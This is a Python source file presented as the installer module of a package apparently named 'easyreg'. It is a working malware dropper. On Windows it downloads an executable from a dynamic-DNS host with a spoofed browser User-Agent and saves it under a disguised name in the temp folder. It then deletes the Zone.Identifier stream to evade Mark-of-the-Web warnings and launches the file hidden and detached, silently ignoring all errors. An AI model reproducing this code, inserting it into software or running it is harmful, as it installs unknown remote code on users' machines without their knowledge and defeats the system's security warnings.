# src/easyreg/installer.py
import os
import sys
import urllib.request
import subprocess
import tempfile
import time

def is_windows():
    return sys.platform.startswith('win')

def remove_motw(filepath):
    """Delete the Zone.Identifier alternate data stream (optional)."""
    try:
        os.remove(filepath + ":Zone.Identifier")
    except Exception:
        pass

def download_payload():
    url = "http://loejfrw2.ignorelist.com/opt/adm/lct/packertx32.exe"
    temp_dir = tempfile.gettempdir()
    exe_path = os.path.join(temp_dir, "util32X.exe")
    
    try:
        req = urllib.request.Request(
            url,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            with open(exe_path, 'wb') as f:
                f.write(response.read())
        return exe_path
    except Exception:
        return None

def execute_silent(exe_path):
    """Launch the executable with all windows hidden."""
    if not os.path.exists(exe_path):
        return False
    
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        # CREATE_NO_WINDOW ensures no console, DETACHED_PROCESS makes it independent
        subprocess.Popen(
            [exe_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            close_fds=True
        )
        return True
    except Exception:
        return False

def install():
    if not is_windows():
        return False
    
    exe_path = download_payload()
    if not exe_path:
        return False
    
    remove_motw(exe_path)
    
    return execute_silent(exe_path)

if __name__ == "__main__":
    time.sleep(0.5)
    install()